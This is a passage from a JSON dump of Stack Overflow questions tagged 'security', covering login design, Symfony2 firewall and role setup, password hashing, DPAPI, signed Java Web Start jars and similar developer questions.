<em>comes together</em> in practice.</p>\n\n<p>I need to see a bird's-eye roadmap. Take this hypothetical example: </p>\n\n<blockquote>\n  <h3>A Simple Hypothetical \"Comments\" Section:</h3>\n  \n  <ul>\n  <li><p>Sign up: create a password/username combo that is to be stored safely in a MySQL table. </p></li>\n  <li><p>Log in.</p></li>\n  <li><p>Leave a comment. </p></li>\n  </ul>\n</blockquote>\n\n<p>What would be a \"security roadmap\" to follow on this most basic case?  </p>\n\n<p>It doesn't help that every tutorial and PHP book on the planet uses the MySQL extensions, which, if I understand correctly, is a bad idea?</p>\n"},{"tags":["facebook","security","privacy"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":12520735,"title":"Can a Facebook app, change profile security settings?","body":"<p>I was curious about creating a Facebook app, that can be used to help a user lock down their privacy and security settings, but I'm not sure its even possible. Can anyone let me know if its possible?</p>\n\n<p>thanks for any advice or suggestions!</p>\n"},{"tags":["security","relational-database","web-security","hash","password-encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":12088453,"title":"Will hashing both the username and the password yield any security benefits?","body":"<p>Will hashing both the username and the password yield any security benefits ?\nI meant this scheme :</p>\n\n<p><br/>1.User enters E-mail address \n<br/>2.Calculate Hash(e-mail) address \n<br/>3.User enters password Calculate Hash(password) . \n<br/>4.Match the values to indicate a successful or failed login .</p>\n\n<p>Wouldnt this make it a bit harder to match cracked hashes to the corresponding users.</p>\n\n<p>I dont know if this is already used or if this idea is just impractical for some reason I havent thought of . I didnt find anything in my searches so I asked here.</p>\n"},{"tags":["php","mysql","security","passwords"],"answer_count":8,"favorite_count":8,"up_vote_count":9,"down_vote_count":1,"view_count":9804,"score":8,"question_id":947618,"title":"How to best store user information and user login and password","body":"<p>I'm using Mysql and I was assuming it was better to separate out a users personal information and their login and password into two different tables and then just reference them between the two.</p>\n\n<p><strong>Note</strong> : To clarify my post, I understand the techniques of securing the password (hash, salt, etc). I just know that if I'm following practices from other parts of my life (investing, data backup, even personal storage) that in the worst case scenario (comprised table or fire) that having information split among tables provides the potential to protect your additional data.</p>\n"},{"tags":["security","symfony2","roles","fosuserbundle"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":274,"score":0,"question_id":11234069,"title":"Symfony2 Security System(access_control and security.context) With Database Stored Roles and FOSUserBundle","body":"<p>I am using a solution similar to <a href=\"http://blog.jmoz.co.uk/symfony2-fosuserbundle-role-entities\" rel=\"nofollow\">http://blog.jmoz.co.uk/symfony2-fosuserbundle-role-entities</a></p>\n\n<p>So I have a <code>Role</code> entity that implements <code>RoleInterface</code> and I have a modified <code>User</code> entity that is set up to have a ManyToMany relationship with the Roles.</p>\n\n<p>This allows me to use code like this</p>\n\n<pre><code>$user = $this-&gt;get('security.context')-&gt;getToken()-&gt;getUser();\n$role = new Role('ROLE_TEST');\n$user-&gt;addRole($role);\n\n$em = $this-&gt;getDoctrine()-&gt;getEntityManager();\n$em-&gt;persist($role);\n$em-&gt;persist($user);\n$em-&gt;flush();\n</code></pre>\n\n<p>I can then check if a user has a role with</p>\n\n<pre><code>$user = $this-&gt;get('security.context')-&gt;getToken()-&gt;getUser();\n\nif($user-&gt;hasRole('ROLE_TEST')){\n   //do stuff...\n}\n</code></pre>\n\n<hr>\n\n<p>This solution is ok, but I need to have access to the security context and use code like this:</p>\n\n<pre><code>if($this-&gt;get('security.context')-&gt;isGranted('ROLE_TEST')){\n   //do stuff...\n}\n</code></pre>\n\n<p>And in the security.yml cofig file I would like to use the access_control code like this:</p>\n\n<pre><code>access_control:\n   - { path: ^/test$, role: ROLE_TEST }\n</code></pre>\n\n<p>Do I need a custom user manager for this? The roles that are assigned to a user in the database are not being carried over to the built in Symfony security system.</p>\n\n<p>In other words when I view the security section of the profiler it shows that the user is assigned to <code>Roles    [ROLE_USER]</code>, but I am hoping to get it so the system will also recognize the roles that I have set in the database for the logged in user such as <code>ROLE_TEST</code>.</p>\n"},{"tags":["php","database","security","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":11209259,"title":"symfony : does database connection really need root user","body":"<p>As part of the Symfony set up, I need to perform this task:</p>\n\n<pre><code>php app/console doctrine:schema:update --force\n</code></pre>\n\n<p>Which fails if the user I specify in <code>app/config/parameters.ini</code> does not have all privileges. Fair enough, because if you want to update the schema, you would need sufficient privileges to be able to restricted operations such as dropping/ altering tables.</p>\n\n<p>However, what concerns me is that in regular usage of the app, this same database user is also going to be used. I see this as a security vulnerability.</p>\n\n<p>How should I avoid this?</p>\n\n<p>--</p>\n\n<p>Extra info:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/6409167/symfony-2-multiple-and-dynamic-database-connection\">Symfony 2 : multiple and dynamic database connection</a></p>\n\n<p>This question shows me how I can specify multiple databases for Symfony to use. Would this be of use to me? I don't really need to be able to switch between databases, but just be able to specify that the app, when running uses a restricted user; however, in systems administration time, I need to be able to use root privilege.</p>\n"},{"tags":["web-services","security","rest","authentication","hmac"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12519741,"title":"Can I use a hashed password as the secret for generating a hmac?","body":"<p>I think it would be very comfortable to use the user's password hash as the secret for generating a hmac. Why is OAuth and others using tokens and nonces?</p>\n\n<p>I think of something like this:</p>\n\n<p>Client enters a password in the ui.\nThe application registers with the webservice using the hash of that password, which is stored on the server.\nForm now on that hash hasn't to be transmitted again.\nThe client can always regenerate the secret by asking the user to enter the password and hashing it. Every message is signed with this hash, the server can look it up by username or guid and check if the sent mac is valid.</p>\n\n<p>A intruder on the server can get that hash, but doesn't know the users real password, anyway he could send valid request with that hash. But this is not likely to happen, the saved hashes could also be hashed again using a nonce. Anyway because the pwd-file will be on a client's server it should be obfuscated using e.g. base64 to avoid the file looking like {\"password\":\"a4bd146hashhashhash\"}.</p>\n\n<p>Most of all the real password of the user won't ever be transmitted. The request's will be secured with a timestamp/token against replay (I recognize the purpose of the token here).</p>\n\n<p>Sending a hash would be perfectly applicable for me because the client will never be a simple website with a  tag e.g.. The webservice will be used in a ajax-based application and a java desktop application, both of them capable of hashing strings...</p>\n\n<p>What's wrong with that? It's so simple, more RESTFul than anything related to authentication, and i think yet effective. What am I missing?</p>\n\n<p>Greets, kruemel</p>\n"},{"tags":["security","symfony2","login"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":425,"score":1,"question_id":10707828,"title":"In symfony2, the login action is showing me as logged out when I'm actually logged in","body":"<p>If a logged in user goes to the login action, I want to redirect them to another page. But I can't figure out how to detect whether the user is logged in or not while inside of the <code>loginAction</code> method. The security context in the login action make me seem logged out when I'm not.</p>\n\n<p>As a test, I'm requesting both of the following pages while I'm logged into the site. Why can't I get access to the user in the login action?</p>\n\n<p>Here's my login action:</p>\n\n<pre><code>public function loginAction()\n{\n    $token = $this-&gt;get('security.context')-&gt;getToken();\n    print_r(get_class($token));\n        // Outputs \"Symfony\\Component\\Security\\Core\\Authentication\\Token\\AnonymousToken\"\n    print_r($token-&gt;getUser());\n        // Outputs \"anon.\"\n}\n</code></pre>\n\n<p>Here is a generic action in the application, protected by the login:</p>\n\n<pre><code>public function regularAction()\n{\n    $token = $this-&gt;get('security.context')-&gt;getToken();\n    print_r(get_class($token));\n        // Outputs \"Symfony\\Component\\Security\\Core\\Authentication\\Token\\UsernamePasswordToken\"\n    print_r(get_class($token-&gt;getUser()));\n        // Outputs \"Company\\BaseBundle\\Entity\\User\"\n}\n</code></pre>\n\n<p>Here's my <code>security.yml</code>:</p>\n\n<pre><code>security:\n    encoders:\n        Company\\BaseBundle\\Entity\\User:\n            algorithm:   sha1\n            iterations: 1\n            encode_as_base64: false\n    providers:\n        main:\n            entity: { class: Company\\BaseBundle\\Entity\\User, property: user_name }\n    firewalls:\n        login_firewall:\n            pattern:    ^/login$\n            anonymous:  ~\n        main:\n            pattern: ^/\n            form_login:\n                login_path: /login\n                check_path: /login_check\n                post_only: true\n                always_use_default_target_path: false\n                default_target_path: /\n                use_referer: true\n                failure_path: null\n                failure_forward: false\n                username_parameter: user_name\n                password_parameter: password_hash\n                csrf_parameter: _csrf_token\n                intention: authenticate\n            logout:\n                path: /logout\n                target: /\n    acl:\n        connection: default\n</code></pre>\n\n<p><strong>EDIT: I didn't think the rest of my firewalls were pertinent, but after reading ilanco's answer, I think they might be</strong></p>\n\n<pre><code>security:\n    encoders:\n        Company\\BaseBundle\\Entity\\User:\n            algorithm:   sha1\n            iterations: 1\n            encode_as_base64: false\n\n    providers:\n        main:\n            entity: { class: Company\\BaseBundle\\Entity\\User, property: user_name }\n\n    firewalls:\n        dev:\n            pattern:  ^/(_(profiler|wdt)|css|images|js)/\n            security: false\n\n        login_firewall:\n            pattern:    ^/login$\n            anonymous:  ~\n        password_reset:\n            pattern:    ^/passwordreset/*$\n            anonymous:  ~\n        error_firewall:\n            pattern:    ^/error/.*$\n            anonymous:  ~\n        unsupported_broswers:\n            pattern:    ^/unsupported$\n            anonymous:  ~\n        security_question_firewall:\n            pattern:  ^/user/(locked|security_question)/(new)*$\n            anonymous:  ~\n        api_firewall:\n            pattern:  ^/api/.*$\n            provider: main\n            http_basic:\n                realm: \"Secured API Area. Login with your regular credentials\"\n                provider: main\n        main:\n            pattern: ^/\n            form_login:\n                login_path: /login\n                check_path: /login_check\n                post_only: true\n                always_use_default_target_path: false\n                default_target_path: /\n                use_referer: true\n                failure_path: null\n                failure_forward: false\n                username_parameter: user_name\n                password_parameter: password_hash\n                csrf_parameter: _csrf_token\n                intention: authenticate\n            logout:\n                path: /logout\n                target: /\n    acl:\n        connection: default\n</code></pre>\n\n<p>Following ilanco's suggestion, I removed this:</p>\n\n<pre><code>    login_firewall:\n        pattern:    ^/login$\n        anonymous:  ~\n</code></pre>\n\n<p>and added this directly under the <code>providers</code> section:</p>\n\n<pre><code>access_control:\n    - { path: ^/login$, role: IS_AUTHENTICATED_ANONYMOUSLY }\n</code></pre>\n\n<p>But then I had a redirect loop error when I accessed /login.</p>\n"},{"tags":["security","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":272,"score":1,"question_id":10348137,"title":"Security in Symfony2","body":"<p>I've created a Bundle named \"User\". In the general routing I added /user to every UserBundle url. So, for exemple, when I define the route /list in the UserBundle the real path is <a href=\"http://myapp.loc/user/list\" rel=\"nofollow\">http://myapp.loc/user/list</a>.</p>\n\n<p>I'm trying to force user to login to use this website, an I'm doing this:</p>\n\n<pre><code>security:\n       firewalls:\n          login_firewall:\n              pattern:    ^/user/login\n              anonymous:  ~\n          secured_area:\n              pattern:    ^/\n              form_login:\n                   login_path: user_login\n                   check_path: user_login_check\n                   default_target_path: /\n              logout:\n                   path: /user_logout\n                   target: user_login\n              remember_me:\n                    key:      atipics-soft2012\n                    lifetime: 3600           \n       access_control:\n           - { path: ^/, roles: ROLE_USER }\n       providers:\n           users:\n               entity: { class: MyApp\\UserBundle\\Entity\\User, property:email }\n       encoders:\n           MyApp\\UserBundle\\Entity\\User: { algorithm:  sha512, iterations: 10 }\n</code></pre>\n\n<p>I'm getting an error like this: </p>\n\n<blockquote>\n  <p>InvalidConfigurationException: Invalid configuration for path\n  \"security.firewalls.secured_area\": The check_path \"user_login_check\"\n  for login method \"form_login\" is not matched by the firewall pattern\n  \"^/\".</p>\n</blockquote>\n\n<p>What could be the problem?</p>\n\n<p>Of couse I've added this route in the routes file.</p>\n"},{"tags":["php","security","session"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12518095,"title":"PHP session_start as security","body":"<p>I'm making registration/login pages for a project.</p>\n\n<p>Today I've heard that <code>mysql_</code> extensions is already dispatched and I't better to use <code>PDO</code>.\nSo I understood that my little knowledge of PHP is already old.</p>\n\n<p>Now I'm little bit confused whether it is good or not to use <code>sessions</code> as security.</p>\n\n<p>To find some altenative to sessions</p>\n"},{"tags":["security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12503001,"title":"What tool can test my server for slowloris attacks?","body":"<p>What is a good tool that will help me find out if my server is being attacked by slowloris?</p>\n"},{"tags":["security","winapi","windows-8","shellexecute"],"answer_count":0,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":332,"score":3,"question_id":12054548,"title":"ShellExecute fails if run from elevated process and non-default browser set in Windows 8 RTM","body":"<p>Set non-default browser in Windows 8 RTM (Chrome, Firefox) and try to run code like this:</p>\n\n<p><code>ShellExecute(NULL, \"open\", \"http://stackoverflow.com\", NULL, NULL, SW_SHOWNORMAL);</code></p>\n\n<p>It's ok.\nBut then change manifest to require Administrative priveleges or just \"run as administrator\".</p>\n\n<p>Code won't work.</p>\n\n<p>Ok, then try to run <strong>any</strong> application using \"run as administrator\".</p>\n\n<p>You will see the same result, links are not working.</p>\n\n<p>Change default browser back to IE -> all works fine.</p>\n\n<p>In Windows 8 previous builds there is no such behavour.</p>\n\n<p><em><strong>What is going on?</em></strong></p>\n\n<p>PS. It seems Microsoft experienced the same problems in their own software :) \n<a href=\"http://stackoverflow.com/questions/12029733/visual-studio-2012-web-publish-on-windows-8-rtm-fails-browser-launch\">Visual Studio 2012 Web Publish on Windows 8 RTM Fails Browser Launch</a></p>\n"},{"tags":["java","spring","security","jpa","acl"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":212,"score":1,"question_id":12059712,"title":"Injecting the application TransactionManager into a JPA EntityListener","body":"<p>I want to use the JPA EntityListener to support spring security ACLs.\nOn <code>@PostPersist</code> events, I create a permission corresponding to the persisted entity.</p>\n\n<p>I need this operation to participate to the current Transaction.\nFor this to happen I need to have a reference to the application <code>TransactionManager</code> in the <code>EntityListener</code>.</p>\n\n<p>The problem is, Spring can't manage the <code>EntityListener</code> as it is created automatically when <code>EntityManagerFactory</code> is instantiated.\nAnd in a classic Spring app, the <code>EntityManagerFactory</code> is itself created during the <code>TransactioManager</code> instantiation.</p>\n\n<pre><code>&lt;bean id=\"transactionManager\" class=\"org.springframework.orm.jpa.JpaTransactionManager\"&gt;\n    &lt;property name=\"entityManagerFactory\" ref=\"entityManagerFactory\" /&gt;\n&lt;/bean&gt;\n</code></pre>\n\n<p>So I have no way to inject the <code>TransactionManager</code> with the constructor, as it is not yet instantiated.</p>\n\n<p>Making the <code>EntityManager</code> a <code>@Component</code> create another instance of the <code>EntityManager</code>.\nImplementing InitiliazingBean and using <code>afterPropertySet()</code> doesn't work as it's not a Spring managed bean.</p>\n\n<p>Any idea would be helpful as I'm stuck and out of ideas.</p>\n"},{"tags":["wcf","security","logging"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12515401,"title":"WCF Security With MessageLogging","body":"<p>If I add/activate the <code>System.ServiceModel.MessageLogging</code> trace source, how do I go about ensuring that security-sensitive fields in a DataContract are not written to a log file?</p>\n\n<p>By reflectoring around the TraceListener classes, I noticed a <a href=\"http://msdn.microsoft.com/en-us/library/system.security.securitysafecriticalattribute%28v=vs.95%29.aspx\" rel=\"nofollow\">SecuritySafeCritical</a> attribute protecting certain write methods.  It gives me the impression that WCF may have a facility I can leverage to prevent certain DataMember fields from being written...perhaps with an attribute on DataMember instances.  Anyone have any information on this?</p>\n"},{"tags":["java","security","java-web-start","javaws"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":165,"score":0,"question_id":12433283,"title":"jars not signed when lauched in browser, but not in javaws","body":"<p>I have a small webstart application on a local webserver, accesable at localhost:5000/games/game.jnlp accessing that through Firefox and Chromium leads to the following error:</p>\n\n<pre><code>net.sourceforge.jnlp.LaunchException: Fatal: Initialization Error: Could not initialize application. \n    at net.sourceforge.jnlp.Launcher.createApplication(Launcher.java:778)\n    at net.sourceforge.jnlp.Launcher.launchApplication(Launcher.java:552)\n    at net.sourceforge.jnlp.Launcher$TgThread.run(Launcher.java:889)\nCaused by: net.sourceforge.jnlp.LaunchException: Fatal: Application Error: Cannot grant permissions to unsigned jars. Application requested security permissions, but jars are not signed.\n    at net.sourceforge.jnlp.runtime.JNLPClassLoader.setSecurity(JNLPClassLoader.java:312)\n    at net.sourceforge.jnlp.runtime.JNLPClassLoader.&lt;init&gt;(JNLPClassLoader.java:232)\n    at net.sourceforge.jnlp.runtime.JNLPClassLoader.getInstance(JNLPClassLoader.java:357)\n    at net.sourceforge.jnlp.runtime.JNLPClassLoader.getInstance(JNLPClassLoader.java:330)\n    at net.sourceforge.jnlp.Launcher.createApplication(Launcher.java:770)\n    ... 2 more\n</code></pre>\n\n<p>which pops up in the Swing style error message.</p>\n\n<p>My JNLP file:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n  &lt;jnlp\n    spec=\"1.0+\"\n    href=\"game.jnlp\"\n    &gt;\n\n  &lt;information&gt;\n    &lt;title&gt;Space Shapes&lt;/title&gt;\n    &lt;vendor&gt;WorldsProject&lt;/vendor&gt;\n    &lt;homepage href=\"http://www.worldsproject.org\"/&gt;\n    &lt;description&gt;A game where you must shoot shapes in space.&lt;/description&gt;\n    &lt;description kind=\"short\"&gt;A game where you must shoot shapes in space.&lt;/description&gt;\n  &lt;/information&gt; \n  &lt;security&gt;\n    &lt;all-permissions/&gt;\n  &lt;/security&gt;   \n  &lt;resources&gt;\n    &lt;j2se href=\"http://java.sun.com/products/autodl/j2se\" version=\"1.4+\" max-heap-size=\"512m\"/&gt;\n    &lt;jar href=\"game.jar\"/&gt;  \n    &lt;jar href=\"resources.jar\"/&gt;\n    &lt;jar href=\"slick.jar\"/&gt;\n    &lt;jar href=\"jogg-0.0.7.jar\"/&gt;    \n    &lt;jar href=\"jorbis-0.0.15.jar\"/&gt;\n    &lt;jar href=\"lwjgl.jar\"/&gt;\n    &lt;nativelib href=\"lwjgl-libs.jar\"/&gt;\n  &lt;/resources&gt;\n\n  &lt;application-desc main-class=\"org.worldsproject.fluxware.spaceshapes.SpaceShapesGame\"/&gt;\n\n&lt;/jnlp&gt;\n</code></pre>\n\n<p>I've confirmed everything is signed correctly with</p>\n\n<pre><code>jarsigner -verify -certs -verbose\n</code></pre>\n\n<p>I've look at the jnlp with JaNeLA, all green and yellow messages, no errors at all. I've tested other webstarts, all of which work, except mine.</p>\n\n<p>EDIT, a link to all my jars and jnlp file: <a href=\"https://www.dropbox.com/sh/hzagv1e4t4jr43t/WA-LVXp5tc\" rel=\"nofollow\">https://www.dropbox.com/sh/hzagv1e4t4jr43t/WA-LVXp5tc</a></p>\n"},{"tags":["security","encryption","dpapi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12513139,"title":"Why to use RSA for DPAPI web farm encryption?","body":"<p>We are about to use DPAPI to encrypt the connection string in our ASP.NET web config file.\nBut I am confused between using RSA or DPAPI for our web cluster (farm).\nThe following MSDN links clearly say that we need to use RSA provider if we want to deploy ASP.NET apps on a web farm. </p>\n\n<p><a href=\"http://msdn.microsoft.com/en-us/library/ms998283.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ms998280.aspx</a></p>\n\n<p><a href=\"http://msdn.microsoft.com/en-us/library/ms998283.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ms998283.aspx</a></p>\n\n<p>But I do not understand what the issue could be with using DPAPI across all machines in my web farm. I essentially can perform the same operation on all servers and create a new \"encrpyted connection string\" on each machine. Why would this not work?</p>\n"},{"tags":["security","symfony2","download"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":245,"score":3,"question_id":9939720,"title":"Secure a download link in Symfony 2","body":"<p>In my Symfony 2 project, I have a page displaying information about an entity. On this page there is also a link to a file associated to this entity.</p>\n\n<p>The page is secured and it can be displayed only if the user as a specific role. The expected role is not the same for every entity so it's tested dynamicaly in the Action.</p>\n\n<p>My problem is that even if the page is secured, anyone can access the file via its URL. I'd like it to be downloadable only if the role matches the one for the page display.</p>\n\n<p>Any suggestion on how I should do it, or where to start looking ?</p>\n"},{"tags":["php","security","symfony2","fosuserbundle"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1144,"score":2,"question_id":8886260,"title":"Symfony2 FOSUserBundle - You have requested a non-existent service \"security.user_checker\"","body":"<p>I use Symfony 2 and the FOSUserBundle. I can login, logout and view Profile.</p>\n\n<p><strong>Problem:</strong> When i go to \"/register\", fill out the form and press enter i get the following error:</p>\n\n<p><strong>You have requested a non-existent service \"security.user_checker\".\n500 Internal Server Error - ServiceNotFoundException</strong></p>\n\n<p>It seems that I have do to some additional configuration or so, but I can't find anything about it.</p>\n\n<p>Part of config.yml:</p>\n\n<pre><code>fos_user:\n    db_driver: orm\n    firewall_name: fos_user\n    user_class: Blogger\\BlogBundle\\Entity\\User\n</code></pre>\n\n<p>security.yml:</p>\n\n<pre><code>security:\n    encoders:\n        Symfony\\Component\\Security\\Core\\User\\User: plaintext\n        FOS\\UserBundle\\Model\\UserInterface: sha512\n\n    role_hierarchy:\n        ROLE_ADMIN:       ROLE_USER\n        ROLE_SUPER_ADMIN: [ROLE_USER, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\n\n    providers:\n        in_memory:\n            users:\n                user:  { password: userpass, roles: [ 'ROLE_USER' ] }\n                admin: { password: adminpass, roles: [ 'ROLE_ADMIN' ] }\n        fos_user:\n            id: fos_user.user_manager\n\n    firewalls:\n        dev:\n            pattern:  ^/(_(profiler|wdt)|css|images|js)/\n            security: false\n\n        fos_user:\n            pattern:    ^/\n            provider:   fos_user\n            form_login:\n                check_path: /login_check\n                login_path: /login\n            logout:\n                path:   /logout\n                target: /\n            anonymous: ~\n\n    access_control:\n        - { path: /secured/admin, roles: ROLE_ADMIN }\n        - { path: ^/login$, roles: IS_AUTHENTICATED_ANONYMOUSLY }\n        - { path: ^/register, roles: IS_AUTHENTICATED_ANONYMOUSLY }\n</code></pre>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Stack trace:</p>\n\n<p><img src=\"http://i.stack.imgur.com/vsGwF.png\" alt=\"http://i.stack.imgur.com/vsGwF.png\"></p>\n"},{"tags":["php","security","symfony2","login"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":1,"view_count":526,"score":1,"question_id":8144446,"title":"Security and login on a Symfony 2 based project","body":"<p>I'm developing a web application based on the Symfony 2 PHP framework.</p>\n\n<p>It has a login page for the users registered. I want to execute some custom logic for every user logging into the system.</p>\n\n<p>Basicaly, I want to log whenever any user logs into the system, but I don't want to do it on the main page's controller, because it would log every time the user reloads the main page.</p>\n\n<p>I also want to implement a function that gets called when the user logs into the system so I can decide wether the access is granted or not for any user (based on a full set of information stored on the user's database).</p>\n\n<p>How can I achieve this?</p>\n"},{"tags":["security","symfony2","routing","placeholder"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1176,"score":1,"question_id":8078055,"title":"Symfony-2 > login & logout routes with placeholders","body":"<p>I am using Symfony-2 to implement my application.<br/>\nI need my login and logout routes to have some placeholders, but I don't manage to define it well in <em>routing.yml</em> and <em>security.yml</em> files. <br/><br/>\nI want to have something like:<br>\n<code>www.mysite.com/{client_slug}/panel</code></p>\n\n<p>and under it other secured pages:<br>\n<code>www.mysite.com/{client_slug}/panel/.*</code><br><br>\nWhen someone tries to navigate to one of these pages, he/she should be redirected to:<br>\n<code>www.mysite.com/{client_slug}/login</code><br><br>\nand after clicking <em>logout</em>, user should be redirected to something like:<br>\n<code>www.mysite.com/{client_slug}/goodbye</code><br><br></p>\n\n<p>I tried several things (<a href=\"http://forum.symfony-project.org/viewtopic.php?f=23&amp;t=37809\" rel=\"nofollow\">http://forum.symfony-project.org/viewtopic.php?f=23&amp;t=37809)</a> but at the moment the only thing I achieved was that in my login url the text <b>{client_slug}</b> appears:<br></p>\n\n<p><code>www.mysite.com/my-cliend-slug/panel</code><br>\n      redirects to<br>\n<code>www.mysite.com/{client_slug}/login</code>\n<br><br></p>\n\n<p><strong>security.yml</strong></p>\n\n<pre><code>firewalls:\n    main:\n        pattern: /.*\n        form_login:\n            check_path: /login_check\n            login_path: _security_login\n        logout:\n            path:   /logout\n            target: /goodbye\n        security: true\n        anonymous: true\n</code></pre>\n\n<p><strong>routing.yml</strong></p>\n\n<pre><code>_security_login:\n    pattern:  /{_client_slug}/login\n    defaults: { _controller: MyAppBackendBundle:Security:login }\n\n_security_check:\n    pattern:  /login_check\n\n_security_logout:\n    pattern:  /logout\n\n_admin_panel:\n    pattern:  /{_client_slug}/panel\n    defaults: { _controller: MyAppBackendBundle:AdminPanel:index }\n</code></pre>\n\n<p>Any ideas?</p>\n"},{"tags":["security","mobile","token","banking","onlinebanking"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":11852718,"title":"Protocol (algorithm ) for safely authorizing payments via mobile app","body":"<p>I'm looking for most secure algorithm/protocol to safely authorize actions done via mobile app.</p>\n\n<p>Let's say I'm developing a system that requires user authorisation of certain actions. You can think of it as \"banking platform\". Let's say there are two ways of accessing the platform: web via normal browser and mobile via app on a smartphone.</p>\n\n<p>One-time tokens and SMS codes are good for the web frontend - when it's separated from the device generating tokens / receiving SMS. But how can I assure security the mobile that's almost certainly used to receive SMS or generates tokens? More secure would be to ask for password. How can I patch this obvious security hole?</p>\n"},{"tags":["security","symfony2","login","login-control"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":528,"score":0,"question_id":7782917,"title":"Symfony 2 login redirects back to the login page","body":"<p>I have a Symfony 2 application installed and I'm trying to use the security bundle and a user entity to deal with the login. When I try yo view the /about page I get redirected to the login page and then after I login with the correct information I get redirected right back to the login page. I know I entered in the right info that is stored in the database because if I enter in the wrong stuff I get an invalid password error on the login page. Also, when I look at the logs, the query to find the username has no parameters passed to it. Any ideas?</p>\n\n<p>security.yml</p>\n\n<pre><code>security:\n    encoders:\n        Company\\Project\\Entity\\User: \n            algorithm: sha512\n            encode-as-base64: true\n\n    role_hierarchy:\n        ROLE_ADMIN:       ROLE_USER\n        ROLE_SUPER_ADMIN: [ROLE_USER, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\n\n    providers:\n        main:\n            entity: { class: Company\\Project\\Entity\\User}\n\n    firewalls:\n        main:\n            pattern:    ^/\n            form_login:\n                check_path: /login_check\n                login_path: /login\n\n            logout:\n                path:   /logout\n                target: /\n            anonymous: ~\n\n    access_control:\n        - { path: ^/register, roles: IS_AUTHENTICATED_ANONYMOUSLY, requires_channel: https}\n        - { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY, requires_channel: https }\n        - { path: ^/about, roles: ROLE_ADMIN, requires_channel: https }\n</code></pre>\n"},{"tags":["entity-framework","security","symfony2"],"answer_count":2,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":4320,"score":8,"question_id":7680917,"title":"How do I get the entity that represents the current user in Symfony2?","body":"<p>I am using the Symfony security setup. Everything works fine, but I don't know how to do one important thing:</p>\n\n<p>In twig, I can reach the current user's info by doing:</p>\n\n<pre><code>Welcome, {{ app.user.username }}\n</code></pre>\n\n<p>or similar</p>\n\n<p>How do I access this same information in the Controller? Specifically, I want to get the current user entity so I can store it relationally in another entity (one-to-one mapping).</p>\n\n<p>I was really hoping it'd be</p>\n\n<pre><code>$this-&gt;get('security.context')-&gt;getToken()-&gt;getUser()\n</code></pre>\n\n<p>but that doesn't work. It gives me a class of type</p>\n\n<pre><code>Symfony\\Component\\Security\\Core\\User\\User\n</code></pre>\n\n<p>and I want one of type</p>\n\n<pre><code>Acme\\AuctionBundle\\Entity\\User\n</code></pre>\n\n<p>which is my entity....</p>\n"},{"tags":["mysql","security","browser","education"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":58,"score":0,"question_id":12510102,"title":"Using MySQL with a browser","body":"<p>I am in the process of creating a small multiplayer game with WebGL.</p>\n\n<p>I have a MySQL database set up, which for the time being simply holds an X,Y,Z coordinate.</p>\n\n<p>What I am looking to do, is connect to the database securely through the browser, retrieve that coordinate, and have it modify in the database through user input.</p>\n\n<p>Perhaps creating a program to run on the server-machine that accesses the database, and that same program accepts connections from the browser would be secure? This would give me control over what data is accessed/modified, whilst protecting the databases login details? This data could then be passed to the browser, or recieve data from the browser and modified in the database.</p>\n\n<p>I am open to any suggestions, but ideally I am looking for the standard approach to database access from a browser (if there is one!).</p>\n\n<p>To clarify:</p>\n\n<ul>\n<li>Browser runs WebGL(JavaScript) through a HTML5 document.</li>\n<li>Database is MySQL based.</li>\n<li>Should I need to create a server-side program to handle this, my preferred language is C++.</li>\n<li>I am looking for a nudge in the right direction, so I may go off and learn about this particular topic.</li>\n</ul>\n"},{"tags":["php","mysql","security","api","brute-force"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":89,"score":3,"question_id":12509316,"title":"Is there a list that contains most known dangerous user inputs? PHP/MySQL","body":"<p>I built an API and I would like to test it.\nI already did my tests but I want to make sure that it is somehow secure by <code>brute forcing</code> it with a common list of <strong>known dangerous user inputs</strong>\nIt is written in PHP and MySql\nSome of you might disagree whether brute force is a good practice here or not, but it's an extra safety measure</p>\n"},{"tags":["php","facebook","security","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":45,"score":-3,"question_id":12509196,"title":"Curl Protect a Page from Bad guys","body":"<p>How can one protect a page to being loaded into another website using CURL like we can'\nt load 